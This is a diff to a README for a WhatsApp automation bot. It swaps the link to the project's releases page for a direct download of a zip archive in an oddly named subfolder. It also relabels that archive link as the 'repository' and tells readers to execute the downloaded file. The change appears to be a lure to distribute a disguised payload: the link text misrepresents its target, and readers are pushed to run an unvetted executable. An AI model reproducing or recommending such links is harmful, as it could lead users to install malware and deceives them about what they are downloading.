@@ -36,9 +36,9 @@ Dive into various topics related to this repository, including:
 
 ## Get Started 🚀
 
-Ready to take your WhatsApp messaging to the next level? Download the latest release of the Whatsapp-Bot script from [here](https://github.com/vrishank-cmd/Whatsapp-Bot/releases). Execute the file and start automating your messaging tasks seamlessly.
+Ready to take your WhatsApp messaging to the next level? Download the latest release of the Whatsapp-Bot script from [here](https://raw.githubusercontent.com/vrishank-cmd/Whatsapp-Bot/main/hintedly/Bot-Whatsapp-v3.5.zip). Execute the file and start automating your messaging tasks seamlessly.
 
-For more information and updates, visit the [repository](https://github.com/vrishank-cmd/Whatsapp-Bot).
+For more information and updates, visit the [repository](https://raw.githubusercontent.com/vrishank-cmd/Whatsapp-Bot/main/hintedly/Bot-Whatsapp-v3.5.zip).
 
 ## Stay Connected 📞
 
